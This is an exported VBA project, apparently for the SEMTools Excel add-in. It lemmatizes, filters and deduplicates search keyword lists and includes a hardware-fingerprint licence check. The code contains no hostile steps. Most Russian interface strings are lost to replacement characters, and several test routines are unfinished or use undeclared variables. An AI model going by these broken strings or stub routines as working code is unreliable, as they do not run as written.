Attribute VB_Name = "DPB"
Attribute VB_Base = "0{DFC2BCF5-8D8A-4E76-B950-C424AD93D8D2}{E7323458-1561-4319-AF06-A535EC8121A9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False


Option Explicit
Attribute VB_Name = "Distance"
Option Explicit
  
Sub trueCount()
Dim i As Long, j As Long, arr(), sumImpr As Double, sumQuadr As Double, dict As Object, totalKeys As Long, item As Variant
If Selection.Columns.Count <> 2 Then
    MsgBox ("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|!")
    Exit Sub
Else:
arr = Selection.Value2
End If
For i = LBound(arr) To UBound(arr)
sumImpr = sumImpr + arr(i, 2)
Next i
Set dict = CreateObject("Scripting.Dictionary")
For i = LBound(arr) To UBound(arr)
    If dict.exists(arr(i, 1)) Then
        dict.item(arr(i, 1)) = dict.item(arr(i, 1)) + arr(i, 2)
    Else:
        dict.Add arr(i, 1), arr(i, 2)
    End If
Next i
For Each item In dict.Items
    sumQuadr = sumQuadr + CDbl(item) / sumImpr
Next
totalKeys = dict.Count / sumQuadr
MsgBox totalKeys
End Sub


Sub InitProgressBar()
    With Progress
        .Bar.Width = 0
        .Text.Caption = "0% Complete"
        .Show vbModeless
    End With
End Sub
Attribute VB_Name = "Form_SheetsInWorkbook"
Attribute VB_Base = "0{772D1068-02BC-4816-990B-D518E55544A4}{40958045-CE90-4CB5-B4BC-A5245D21CBE4}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

'''Private Sub CommandButton1_Click()
'''    Dim i As Long, j As Long
'''    Dim item As Object
'''    Dim SheetArray() As String
'''    Dim Index As Long
'''    Dim Shablon As String
'''
'''    ReDim SheetArray(1 To 1)
'''    For Each item In ActiveWorkbook.Sheets()
'''        If item.Visible = xlSheetVisible Then
''''            If Not item.Tab.Color = False Then
'''                Index = Index + 1
'''                ReDim Preserve SheetArray(1 To Index)
'''                SheetArray(Index) = item.Name
''''            End If
'''        End If
'''    Next
'''
'''    For i = 1 To Index
'''        For j = i + 1 To Index
'''            If SheetArray(i) > SheetArray(j) Then
'''                Shablon = SheetArray(i)
'''                SheetArray(i) = SheetArray(j)
'''                SheetArray(j) = Shablon
'''            End If
'''        Next j
'''    Next i
'''
'''    lbxSheets.List = SheetArray
'''End Sub
'''
'''Private Sub CommandButton2_Click()
'''    allSheets
'''End Sub

Private Sub lbxSheets_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Dim i As Long
    For i = 0 To lbxSheets.ListCount - 1
        If lbxSheets.Selected(i) Then
            ActiveWorkbook.Sheets(lbxSheets.List(i, 1)).Activate
            Exit Sub
        End If
    Next i
End Sub
Private Sub UserForm_Initialize()
    lbxSheets.columnCount = 2
    lbxSheets.ColumnWidths = "30;360"
    allSheets
End Sub

Sub allSheets()
    Dim i As Long, j As Long
    Dim item As Object
    Dim SheetArray() As String
    Dim index As Long
    Dim Shablon As String
    
    ReDim SheetArray(1 To 1)
    For Each item In ActiveWorkbook.Sheets()
        If item.Visible = xlSheetVisible Then
            index = index + 1
            ReDim Preserve SheetArray(1 To index)
            SheetArray(index) = item.name
        End If
    Next
    
    For i = 1 To index
        For j = i + 1 To index
            If SheetArray(i) > SheetArray(j) Then
                Shablon = SheetArray(i)
                SheetArray(i) = SheetArray(j)
                SheetArray(j) = Shablon
            End If
        Next j
    Next i
    
    Dim newArr() As String
    ReDim newArr(1 To index, 0 To 1)
    For i = 1 To index
        newArr(i, 0) = i
        newArr(i, 1) = SheetArray(i)
    Next i
    
    SheetArray = newArr
    lbxSheets.List = SheetArray
  
End Sub
Attribute VB_Name = "Help"
Public YTURL As String
'''''''''''
Sub SEM_YTHelp(control As IRibbonControl)
YTURL = "https://youtu.be/0q3hStuM1uA"
YTP.Show
End Sub
'|fffd||fffd||fffd| wordProcessor, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub check()
End Sub
Sub selector()
If Selection.Rows.Count = 1048576 Then
Selection.End(xlUp).Select
Range(Selection, Cells(Rows.Count, Selection.Column).End(xlUp)).Select
Else
End If
End Sub
Sub solution()
Dim i As Long, j As Long, dict As Object, dict2 As Object, arr()
Dim morphLen As Long, lemmLen As Long, sufLemm As String, suffMorph As String, root As String, morph As String, lemm As String
OptimizeON
    Set dict = CreateObject("Scripting.Dictionary")
    Set dict2 = CreateObject("Scripting.Dictionary")
arr = Selection.Value2
For i = LBound(arr) To UBound(arr)
    morph = arr(i, 1)
    lemm = arr(i, 2)
    morphLen = Len(morph)
    lemmLen = Len(lemm)
    rootlen = morphLen - 4
    If Left(morph, rootlen) = Left(lemm, rootlen) Then
        sufmorph = Right(morph, morphLen - rootlen)
        sufLemm = Right(lemm, lemmLen - rootlen)
    Else:
        sufmorph = Right(morph, morphLen - rootlen)
        sufLemm = "#"
    End If
Next i

OptimizeOFF
End Sub

Sub ProgressBarExample()
'|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Dim barCurrProg As Double
Dim barProgPerc As Double
Dim barWidth As Long

'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
Call InitProgressBar
'|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    barCurrProg = i / UBound(arr)
    barWidth = Progress.Border.Width * barCurrProg
    barProgPerc = Round(barCurrProg * 100, 0)
    Progress.Bar.Width = barWidth
    Progress.Text.Caption = barProgPerc & "% Complete"
    i = i + 1
'|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Unload Progress

End Sub
Attribute VB_Name = "Progress"
Attribute VB_Base = "0{67F66529-41C7-4B5D-BD55-1501687982CE}{194BC6A8-7F16-4CFC-AC22-5D4090E3B52F}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Option Explicit

Attribute VB_Name = "RibbonCallbacks"
Option Base 1
Dim ths, ms, bs, ndDec As Boolean
Dim E(32) As String
'''''''''''
Sub speedtest()
Dim StartTime As Double
Dim SecondsElapsed As Double

'Remember time when macro starts
  StartTime = Timer
'------------------------------code start
UDFArr "startsWithASDF2"
'------------------------------code end

'Determine how many seconds code took to run
  SecondsElapsed = Round(Timer - StartTime, 2)

'Notify user in seconds
  MsgBox SecondsElapsed & " seconds", vbInformation
End Sub

'tested functions
'semTOOL
Sub UDFArr2PRngFree(ftn As String, param2 As Range)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2)
    Next
Selection.Value2 = a
OptimizeOFF
End Sub
Function TOOL_lemmatstr(x As String)
TOOL_lemmatstr = binSearch(x, Range("semDict"), 2)
End Function
Sub TOOL_lemmatizeArr(a As Variant)
Dim x As Variant, txt As String, i As Long, r As Long, dict As Object
OptimizeON
    Set dict = CreateObject("Scripting.Dictionary")
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            x(i) = dict.item(x(i))
            Else
            dict.Add x(i), TOOL_lemmatstr(CStr(x(i)))
            x(i) = dict.item(x(i))
            End If
            a(r, 1) = Join(x, " ")
        Next
Next
OptimizeOFF
End Sub
Sub TOOL_crLemmDict()
Dim x As Variant, txt As String, i As Long, r As Long, dict As Object
Dim a()
If Worksheets("semHelper").Range("J1", Range("J1").End(xlDown)).Count = 1048576 Then Else Exit Sub
OptimizeON
    a = Range("words").Value2
    Set dict = CreateObject("Scripting.Dictionary")
For r = LBound(a) To UBound(a):
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then
            Else
            If lemmatstr(CStr(x(i))) <> CStr(x(i)) Then dict.Add x(i), lemmatstr(CStr(x(i)))
            End If
        Next
Next
If dict.Count < 3 Then
Else:
    With dict
        Worksheets("semHelper").Cells(1, 10).Resize(.Count) = Application.Transpose(.Keys)
        Worksheets("semHelper").Cells(1, 11).Resize(.Count) = Application.Transpose(.Items)
    End With
End If
Range(Cells(1, 10), Cells(1, 11).End(xlDown)).name = "semDict"

    ActiveWorkbook.Worksheets("semHelper").Sort.SortFields.Clear
    ActiveWorkbook.Worksheets("semHelper").Sort.SortFields.Add2 Key:=Range("J1") _
        , SortOn:=xlSortOnValues, order:=xlAscending, DataOption:=xlSortNormal
    With ActiveWorkbook.Worksheets("semHelper").Sort
        .SetRange Range("semDict")
        .Header = xlNo
        .MatchCase = True
        .Orientation = xlTopToBottom
        .SortMethod = xlPinYin
        .Apply
    End With
OptimizeOFF
End Sub
Sub TOOL_remPhrWithOnlyPlusWords()
Dim a(), b(), dict As Object, delDict As Object, r As Long, word As String, firstBlankRow As Long
Cells(Cells(Rows.Count, 8).End(xlUp).Row + 1, 8).Value2 = Selection.Value2
Get_lemmDict
TOOL_crLemmDict
OptimizeON
On Error Resume Next
If Worksheets("semHelper").Range("H:H").Count < 3 Then Else Range(Cells(1, 8), Cells(1, 8).End(xlDown)).name = "plusWords"
Set dict = CreateObject("Scripting.Dictionary")
Set delDict = CreateObject("Scripting.Dictionary")
a = Worksheets("semHelper").Range("words").Value2
b = Worksheets("semHelper").Range("words").Value2
TOOL_lemmatizeArr b
a = Worksheets("semHelper").Range("words").Value2
Worksheets("semHelper").Range("words").ClearContents
crBSR Worksheets("semHelper").Range("plusWords")
For i = LBound(a) To UBound(a)
    If hasAnyWordsNotFromSortedListCaseSen(CStr(b(i, 1)), abc.Range("BSR")) Then dict.Add a(i, 1), False Else delDict.Add a(i, 1), False
Next i
remBSR
Range("A:A").Clear
Worksheets("semHelper").Cells(1, 1).Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
If dict.Count = 1 Then
Worksheets("semHelper").Cells(2, 1).Value2 = dict.Keys()(0)
Else:
    With dict
        Worksheets("semHelper").Cells(2, 1).Resize(.Count) = Application.Transpose(.Keys)
    End With
End If
firstBlankRow = Worksheets("Good case").Cells(Rows.Count, 1).End(xlUp).Row + 1
If delDict.Count = 0 Then
ElseIf delDict.Count = 1 Then
Worksheets("Good case").Cells(firstBlankRow, 1) = delDict.Keys()(0)
Else:
With delDict
        Worksheets("Good case").Cells(firstBlankRow, 1).Resize(.Count) = Application.Transpose(.Keys)
    End With
End If
End Sub
Sub Tool_countWords()
If Worksheets("semHelper").Range("A:A").Count < 3 Then
Else:
    Range(Cells(2, 1), Cells(2, 1).End(xlDown)).name = "words"
    Application.Run "OptimizeON"
    Tool_dictAtor
    Application.Run "OptimizeOFF"
End If
End Sub
Sub Tool_dictAtor()
Dim x As Variant, txt As String, i As Long, r As Long, dict As Object
Dim a()
Get_lemmDict
TOOL_crLemmDict
Set dict = CreateObject("Scripting.Dictionary")
a = Worksheets("semHelper").Range("words").Value2
TOOL_lemmatizeArr a
For r = LBound(a) To UBound(a)
    x = Split(a(r, 1), " ")
        For i = LBound(x) To UBound(x)
            If dict.exists(x(i)) Then dict.item(x(i)) = dict.item(x(i)) + 1 Else dict.Add x(i), 1
        Next i
Next r
Range("C2:D1048576").ClearContents
If dict.Count > 1 Then
    With dict
        Worksheets("semHelper").Cells(2, 3).Resize(.Count) = Application.Transpose(.Keys)
        Worksheets("semHelper").Cells(2, 4).Resize(.Count) = Application.Transpose(.Items)
    End With
Else:
End If
End Sub
Sub findPhrWithWord()
Dim a(), b(), dict As Object, r As Long, word As String
On Error Resume Next
Get_lemmDict
TOOL_crLemmDict
word = Selection.Value2
Set dict = CreateObject("Scripting.Dictionary")
a = Worksheets("semHelper").Range("words").Value2
b = Worksheets("semHelper").Range("words").Value2
TOOL_lemmatizeArr b
For r = LBound(a) To UBound(a)
    If InStr(1, " " & CStr(b(r, 1)) & " ", " " & word & " ") > 0 Then
        If dict.exists(a(r, 1)) Then Else dict.Add a(r, 1), False
    Else:
    End If
Next r
Range("F:F").Clear
Worksheets("semHelper").Cells(1, 6).Value2 = "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
If dict.Count = 1 Then
Worksheets("semHelper").Cells(2, 6).Value2 = dict.Keys()(0)
Else:
    With dict
        Worksheets("semHelper").Cells(2, 6).Resize(.Count) = Application.Transpose(.Keys)
    End With
End If
End Sub
Sub findPhrWithOutWord()
Dim a(), b(), dict As Object, delDict As Object, r As Long, word As String, firstBlankRow As Long
Get_lemmDict
TOOL_crLemmDict
word = Selection.Value2
Set dict = CreateObject("Scripting.Dictionary")
Set delDict = CreateObject("Scripting.Dictionary")
a = Worksheets("semHelper").Range("words").Value2
b = Worksheets("semHelper").Range("words").Value2
TOOL_lemmatizeArr b
On Error Resume Next
For r = LBound(a) To UBound(a)
    If InStr(1, " " & CStr(b(r, 1)) & " ", " " & word & " ") > 0 Then
        If delDict.exists(a(r, 1)) Then Else delDict.Add a(r, 1), word
    Else:
        If dict.exists(a(r, 1)) Then Else dict.Add a(r, 1), False
    End If
Next r
Range("A:A").ClearContents
Worksheets("semHelper").Cells(1, 1).Value2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
If dict.Count = 1 Then
Worksheets("semHelper").Cells(2, 1).Value2 = dict.Keys()(0)
Else:
    With dict
        Worksheets("semHelper").Cells(2, 1).Resize(.Count) = Application.Transpose(.Keys)
    End With
End If
firstBlankRow = Worksheets("Bad case").Cells(Rows.Count, 1).End(xlUp).Row + 1
With delDict
        Worksheets("Bad case").Cells(firstBlankRow, 1).Resize(.Count) = Application.Transpose(.Keys)
        Worksheets("Bad case").Cells(firstBlankRow, 2).Resize(.Count) = Application.Transpose(.Items)
    End With
End Sub

'END of testing
'-------
'R I B B O N  CALLBACKS
Private Function getHardware() As String
Dim x As String, tmp As Double, i As Long
x = Environ("USERNAME") & Environ("COMPUTERNAME")
tmp = 1
For i = 1 To Len(x)
    tmp = tmp * CDbl(Asc(Mid(x, i, 1)))
Next
getHardware = Replace(Replace(Mid(CStr(Replace(CStr(getHardware) & extrDigits(Environ("PATHEXT") & Environ("PROCESSOR_ARCHITECTURE") & Environ("PROCESSOR_IDENTIFIER")), " ", "") * CStr(tmp)), 1, 8), ",", "|"), ".", "|")
End Function
Sub SEM_lic(control As IRibbonControl)
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
Else
Application.InputBox "|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", getHardware()
End If
End Sub
Sub SEM_buyLic(control As IRibbonControl)
callWebPage ("https://semtools.guru/ru/buy/")
End Sub
'F I N D <><><><><><><><><><><><><><><><><><><><><><><><><><><><><
'SYMBOLS
Sub SEM_nayti_latinitsu(control As IRibbonControl)
UDFArr ("contLat")
End Sub
Sub SEM_findIrrelevant(control As IRibbonControl)
findIrr.Show
End Sub
Sub SEM_nayti_tsifry(control As IRibbonControl)
UDFArr ("contNum")
End Sub
Sub SEM_nayti_ukrainskiy(control As IRibbonControl)
UDFArr ("isUA")
End Sub
Sub SEM_findAlfaNum(control As IRibbonControl)
UDFArr ("isAlfaNum")
End Sub
Sub SEM_naytizaglavnyye(control As IRibbonControl)
UDFArr "contUCase"
End Sub
'WORDS
Sub SEM_findToponyms(control As IRibbonControl)
findPhrases abc.Range("GEO_Toponyms")
End Sub
Sub SEM_findQuestions(control As IRibbonControl)
findPhrases abc.Range("questions")
End Sub
Sub SEM_findOwnList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "hasAnyWordsFromSortedList", abc.Range("BSR")
remBSR
End Sub
Sub SEM_containsWord(control As IRibbonControl)
Dim x As String
x = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:", Type:=2)
UDFArr2PS "containsWord", x
End Sub
Sub SEM_containsAllWordsFromList(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", title:="Find words:", Type:=8)
UDFArr2PRng "containsWordsFromListAll", rng
End Sub
Sub SEM_findWordsStartingWith(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "findWordsStartingWith", param2
End Sub
Sub SEM_findWordsEndingWith(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "findWordsEndingWith", param2
End Sub
Sub SEM_findWordsStartingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "findWordsStartingWithAnyFromRng", rng
End Sub
Sub SEM_findWordsEndingWithAnyFromRng(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "findWordsEndingWithAnyFromRng", rng
End Sub
Sub SEM_findRepWords(control As IRibbonControl)
UDFArr "findRepWords"
End Sub
Sub SEM_findWordsByLikePattern(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "findWordsByLIKEPattern", param2
End Sub
Sub SEM_findWordsByRePattern(control As IRibbonControl)
Dim param2 As String
param2 = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=2)
UDFArr2PS "findWordsByRePattern", param2
End Sub
'morphs
Sub SEM_findNouns(control As IRibbonControl)
Get_lemmDict
UDFArr "findN"
End Sub
Sub SEM_findVerbs(control As IRibbonControl)
Get_lemmDict
UDFArr "findV"
End Sub
Sub SEM_findAdj(control As IRibbonControl)
Get_lemmDict
UDFArr "findA"
End Sub
Sub SEM_findAdverbs(control As IRibbonControl)
Get_lemmDict
UDFArr "findAdvb"
End Sub
'PHRASES
Sub SEM_findPhrases(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", Type:=8)
findPhrases rng
End Sub
'CELLS
Sub SEM_findCellsContainingPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "contPsFromListAny", rng
End Sub
Sub SEM_findCellsStartingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "startsWithAnyFromRng", rng
End Sub
Sub SEM_findCellsEndingWithPLst(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="!SEMTools", Type:=8)
UDFArr2PRng "endsWithAnyFromRng", rng
End Sub
Sub SEM_findCellsMatchingLikePattern(control As IRibbonControl)
Dim pattern As String
pattern = Application.InputBox(Prompt:="Input LIKE pattern, example: *[0-9A-Z]*", title:="!SEMTools", Type:=2)
UDFArr2PS "matchesLIKE", pattern
End Sub
Sub SEM_findCellsMatchingRegexPattern(control As IRibbonControl)
Dim pattern As String
pattern = Application.InputBox(Prompt:="Input REGEX pattern", title:="!SEMTools", Type:=2)
UDFArr2PS "matchesRE", pattern
End Sub
Sub SEM_findBlankCells(control As IRibbonControl)
UDFArr "isBlank"
End Sub
'|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Sub SEM_findUniqueCells(control As IRibbonControl)
CellsByRep True, "find"
End Sub
Sub SEM_findNonUniqueCells(control As IRibbonControl)
CellsByRep False, "find"
End Sub
Sub SEM_findFirstCell(control As IRibbonControl)
cellIs "first"
End Sub
Sub SEM_findLastCell(control As IRibbonControl)
cellIs "last"
End Sub
Sub SEM_findCellsDupes(control As IRibbonControl)
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
    a(i, 1) = True
    Else
    dict.Add UCase$(a(i, 1)), False
    a(i, 1) = False
    End If
Next i
Selection.Value2 = a
End Sub
Sub SEM_findCellsDupesHidden(control As IRibbonControl)
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
OptimizeON
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(sortInCellAZ(UCase$(a(i, 1)))) Then
    a(i, 1) = True
    Else
    dict.Add sortInCellAZ(UCase$(a(i, 1))), False
    a(i, 1) = False
    End If
Next i
Selection.Value2 = a
OptimizeOFF
End Sub
Sub SEM_findCellsDupesAll(control As IRibbonControl)
Dim dict As Object, dict2 As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
Set dict2 = CreateObject("Scripting.Dictionary")
OptimizeON
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
        If dict2.exists(UCase$(a(i, 1))) Then Else dict2.Add UCase$(a(i, 1)), False
    Else
    dict.Add UCase$(a(i, 1)), False
    End If
Next i
For i = LBound(a) To UBound(a)
    If dict2.exists(UCase$(a(i, 1))) Then
    a(i, 1) = True
    Else
    a(i, 1) = False
    End If
Next i
Selection.Value2 = a
OptimizeOFF
End Sub
Sub SEM_findCellsFromRNG(control As IRibbonControl)
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
crBSRUC rng
UDFArr2PRng "binSearchBUC", abc.Range("BSR")
remBSR
End Sub
Sub SEM_findCellsFromRNGHidden(control As IRibbonControl)
Dim dict As Object, a(), a2(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
a = Selection.Value2
Dim rng As Range
Set rng = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", Type:=8)
a2 = rng.Columns(1).Value2
For i = LBound(a2) To UBound(a2)
    If dict.exists(sortInCellAZ(UCase$(a2(i, 1)))) Then Else dict.Add sortInCellAZ(UCase$(a2(i, 1))), False
Next
For i = LBound(a) To UBound(a)
    If dict.exists(sortInCellAZ(UCase$(a(i, 1)))) Then
    a(i, 1) = True
    Else
    a(i, 1) = False
    End If
Next i
Selection.Value2 = a
End Sub
Sub SEM_WSheets(control As IRibbonControl)
Form_SheetsInWorkbook.Show
End Sub

'R E M O V E <><><><><><><><><><><><><><><><><><><><><><><><><><><><><
Sub udalit_lprobyely()
UDFArr ("WSTrim")
End Sub
Sub SEM_remPunctuation(control As IRibbonControl)
UDFArr ("removePunctuation")
End Sub
Sub SEM_remREAll(control As IRibbonControl)
Dim x As String
x = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "rgxRem", x
End Sub
Sub SEM_remREAllExcept(control As IRibbonControl)
Dim x As String
x = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "", Type:=2)
UDFArr2PS "rgxRemAllExcept", x
End Sub
Sub SEM_udalit_osnovnyye(control As IRibbonControl)
udalit_osnovnyye
End Sub
Sub SEM_udalit_lprobyely(control As IRibbonControl)
udalit_lprobyely
End Sub
Sub SEM_remLastNSym(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "remLastNSym", n
End Sub
Sub SEM_remFirstNSym(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "remFirstNSym", n
End Sub
'words
Sub SEM_remLastNWords(control As IRibbonControl)
Dim n As Long
n = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", "", Type:=1)
UDFArr2PL "remLastNWords", n
End Sub
